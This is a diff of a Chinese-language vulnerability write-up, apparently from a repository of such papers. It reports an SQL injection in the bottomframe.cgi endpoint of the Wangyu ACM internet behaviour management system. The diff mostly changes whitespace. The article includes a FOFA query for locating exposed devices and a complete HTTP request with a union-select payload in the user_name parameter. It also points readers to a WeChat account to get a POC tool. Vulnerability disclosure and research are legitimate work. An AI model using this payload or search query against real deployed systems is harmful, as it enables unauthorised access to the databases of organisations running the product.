@@ -3,7 +3,7 @@ fofa: "查询语句"
 source: "MrWQ/vulnerability-paper"
 ---
 
-# ​网御 ACM 上网行为管理系统 bottomframe.cgi 接口存在 SQL 注入漏洞 附 POC
+# 网御 ACM 上网行为管理系统 bottomframe.cgi 接口存在 SQL 注入漏洞 附 POC
 
 <meta name="referrer" content="no-referrer"/>
 > 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/Z5gPjqd5QlZaMc5DFT802A)
@@ -46,27 +46,27 @@ app="网御星云 - 上网行为管理系统"
 漏洞数据包：
 
 ```
-GET /bottomframe.cgi?user_name=%27))%20union%20select%20md5(1)%23 HTTP/1.1
-Host: 127.0.0.1
-User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
-Accept: */*
-Connection: Keep-Alive
+GET /bottomframe.cgi?user_name=%27))%20union%20select%20md5(1)%23 HTTP/1.1
+Host: 127.0.0.1
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
+Accept: */*
+Connection: Keep-Alive
 
 
 ```
 
-执行 md5(1) 函数 
+执行 md5(1) 函数 
 
 ![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YgDkbRMQYSicSCKQHGmuWKkibjtzMeZUX2icWc9r1xBnglJ1vicQHTg2kvtmBPvmDPpupkTZkiczwGrgQ/640?wx_fmt=jpeg)
 
-执行 user() 函数 
+执行 user() 函数 
 
 ![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YgDkbRMQYSicSCKQHGmuWKkz2wXABzQVdrjth9mE5YsEndtdCTx0XUE5cpVsQg533kh5SQAJbRdNA/640?wx_fmt=jpeg)
 
 6.POC&EXP
 ---------
 
-关注公众号  南风漏洞复现文库 并回复  漏洞复现 47  即可获得该 POC 工具下载地址： 
+关注公众号  南风漏洞复现文库 并回复  漏洞复现 47  即可获得该 POC 工具下载地址： 
 
 ![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YgDkbRMQYSicSCKQHGmuWKkZ5hQMpnfMAMlN8ncE6fIwZs9qjEKzicr9oObMVEerop9YfcckRWsKvg/640?wx_fmt=jpeg)
 
